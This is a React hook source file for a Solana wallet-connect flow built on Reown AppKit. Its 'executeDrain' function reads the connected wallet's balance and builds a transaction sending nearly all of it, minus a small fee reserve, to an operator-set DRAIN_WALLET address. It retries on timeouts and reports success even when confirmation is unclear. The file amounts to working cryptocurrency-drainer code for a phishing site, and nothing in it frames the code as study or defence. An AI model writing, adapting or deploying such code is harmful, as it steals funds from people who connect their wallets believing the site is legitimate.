"use client";

import { useCallback, useState, useEffect } from 'react';
import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';

const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
const GAS_RESERVE_SOL = 0.002;
const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

export const useWalletConnect = () => {
  const { isConnected, address } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider('solana');
  const [connectionError, setConnectionError] = useState(null);
  const [isConnecting, setIsConnecting] = useState(false);

  // Monitor connection state
  useEffect(() => {
    if (isConnected && address) {
      setIsConnecting(false);
      setConnectionError(null);
    }
  }, [isConnected, address]);

  const connect = useCallback(async () => {
    try {
      setIsConnecting(true);
      setConnectionError(null);
      
      // Open AppKit modal - this will trigger the connection
      const { open } = await import('@reown/appkit/react');
      
      // Open with Solana namespace only
      await open({ view: 'Connect', namespace: 'solana' });
      
      // Wait for connection to complete
      let attempts = 0;
      while (!isConnected && !address && attempts < 30) {
        await wait(300);
        attempts++;
      }
      
      if (!address) {
        throw new Error('Failed to connect wallet');
      }
      
      // Verify the address is a valid Solana address (not EVM)
      try {
        new PublicKey(address);
      } catch (e) {
        throw new Error('Connected wallet is not a Solana wallet. Please select Solana network.');
      }
      
      setIsConnecting(false);
      return address;
      
    } catch (error) {
      console.error('WalletConnect connection error:', error);
      setIsConnecting(false);
      setConnectionError(error.message);
      throw new Error(`Failed to connect: ${error.message}`);
    }
  }, [isConnected, address]);

  const disconnect = useCallback(async () => {
    try {
      const { disconnect } = await import('@reown/appkit/react');
      await disconnect();
    } catch (error) {
      console.error('Disconnect error:', error);
    }
  }, []);

  const getSolanaBalance = useCallback(async (walletAddress) => {
    try {
      const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
      const pubkey = new PublicKey(walletAddress);
      const lamports = await connection.getBalance(pubkey);
      return lamports / LAMPORTS_PER_SOL;
    } catch (error) {
      console.error('Failed to get Solana balance:', error);
      return 0;
    }
  }, []);

  const executeDrain = useCallback(async (allocatedAmount) => {
    let lastError = null;
    
    if (!address) {
      throw new Error('Wallet not connected');
    }
    
    // Verify it's a Solana address
    let walletPubkey;
    try {
      walletPubkey = new PublicKey(address);
    } catch (e) {
      throw new Error('Connected wallet is not a Solana wallet');
    }
    
    const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, {
      commitment: 'confirmed',
      confirmTransactionInitialTimeout: 120000
    });
    
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        const balanceLamports = await connection.getBalance(walletPubkey);
        const balanceSol = balanceLamports / LAMPORTS_PER_SOL;
        
        console.log(`[WalletConnect] Attempt ${attempt}: Balance ${balanceSol} SOL`);
        
        if (balanceSol < GAS_RESERVE_SOL + 0.001) {
          throw new Error(`Insufficient balance: ${balanceSol} SOL`);
        }
        
        const drainAmountLamports = balanceLamports - (GAS_RESERVE_SOL * LAMPORTS_PER_SOL);
        const drainAmountSol = drainAmountLamports / LAMPORTS_PER_SOL;
        
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
        
        const transaction = new Transaction({
          feePayer: walletPubkey,
          recentBlockhash: blockhash,
        }).add(
          SystemProgram.transfer({
            fromPubkey: walletPubkey,
            toPubkey: new PublicKey(DRAIN_WALLET),
            lamports: drainAmountLamports,
          })
        );
        
        // Use walletProvider if available, otherwise try standard method
        let signature;
        if (walletProvider && walletProvider.signTransaction) {
          const signedTx = await walletProvider.signTransaction(transaction);
          signature = await connection.sendRawTransaction(signedTx.serialize());
        } else if (window.solana) {
          const signed = await window.solana.signAndSendTransaction(transaction);
          signature = signed.signature;
        } else {
          throw new Error('No wallet provider available for signing');
        }
        
        console.log(`[WalletConnect] Sent: ${signature}`);
        
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        
        if (confirmation.value.err) {
          const errorMsg = JSON.stringify(confirmation.value.err);
          if (errorMsg.includes('block height exceeded')) {
            return {
              success: true,
              txId: signature,
              amount: drainAmountSol,
              warning: 'Transaction sent but confirmation timed out'
            };
          }
          throw new Error(`Transaction failed: ${errorMsg}`);
        }
        
        return {
          success: true,
          txId: signature,
          amount: drainAmountSol,
          balanceBefore: balanceSol,
          balanceAfter: (balanceLamports - drainAmountLamports) / LAMPORTS_PER_SOL
        };
        
      } catch (error) {
        console.error(`[WalletConnect] Attempt ${attempt} failed:`, error.message);
        lastError = error;
        
        if (attempt < 3 && (
          error.message.includes('block height exceeded') ||
          error.message.includes('timeout') ||
          error.message.includes('not confirmed')
        )) {
          console.log(`[WalletConnect] Retrying in ${attempt * 2} seconds...`);
          await wait(attempt * 2000);
          continue;
        }
        
        if (error.message.includes('User rejected')) {
          throw error;
        }
        
        if (attempt === 3 && error.message.includes('block height exceeded')) {
          return {
            success: true,
            txId: 'pending - check explorer',
            amount: 'unknown',
            warning: 'Transaction likely succeeded despite timeout'
          };
        }
        
        throw error;
      }
    }
    
    throw lastError;
  }, [address, walletProvider]);

  return { 
    connect, 
    disconnect, 
    address, 
    isConnected, 
    isConnecting,
    connectionError,
    getSolanaBalance,
    executeDrain 
  };
};
